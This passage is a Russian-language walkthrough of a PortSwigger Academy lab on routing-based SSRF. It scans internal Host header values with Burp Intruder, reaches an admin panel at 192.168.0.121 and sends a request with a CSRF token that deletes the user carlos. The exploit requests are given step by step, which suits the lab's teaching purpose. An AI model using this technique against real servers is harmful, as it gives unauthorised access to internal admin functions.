Перейдем на уязвимый ресурс

откроем `Proxy` -> `HTTP history` и изучим запросы

Отправим запрос на корневую страницу в `Repeater`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/4.%20Routing-based%20SSRF/pics%20for%20walkthrough/1.png)

По заданию нам известно, что админка расположена в сетке `192.168.0.0/24
`
отправим запрос в `Intruder`

и изменим параметр `Host` на 
```
Host: 192.168.0.§0§
```

Выберем `attack type sniper`
и уберем галочку `update Host Header to match target`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/4.%20Routing-based%20SSRF/pics%20for%20walkthrough/2.png)

А в payload выберем numbers и выберем числа от 0 до 255

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/4.%20Routing-based%20SSRF/pics%20for%20walkthrough/3.png)

Далее запустим атаку, отсортируем по status code'ам и увидим, что только у одного происходит редирект - 

`Host: 192.168.0.121`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/4.%20Routing-based%20SSRF/pics%20for%20walkthrough/4.png)

Вернемся в `Repeater` и отправим запрос с 
```
GET / HTTP/2
Host: 192.168.0.121
```
нажмем `Follow redirection` и узнаем как нам удалить carlos

```
                   <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
                        <input required type="hidden" name="csrf" value="GForVsqn8ShA1zs5bvtQ64MvIzknqEw8">
                        <label>Username</label>
                        <input required type='text' name='username'>
                        <button class='button' type='submit'>Delete user</button>
                    </form>
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/4.%20Routing-based%20SSRF/pics%20for%20walkthrough/5.png)

При анализе мы понимаем, что нужен путь `/admin/delete` `username=carlos` и csrf токен `GForVsqn8ShA1zs5bvtQ64MvIzknqEw8`

Соединим все и получим 
```
GET /admin/delete?csrf=GForVsqn8ShA1zs5bvtQ64MvIzknqEw8&username=carlos HTTP/2
```

Отправим, и получим уведомление о успешно выполненной атаке

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/4.%20Routing-based%20SSRF/pics%20for%20walkthrough/6.png)
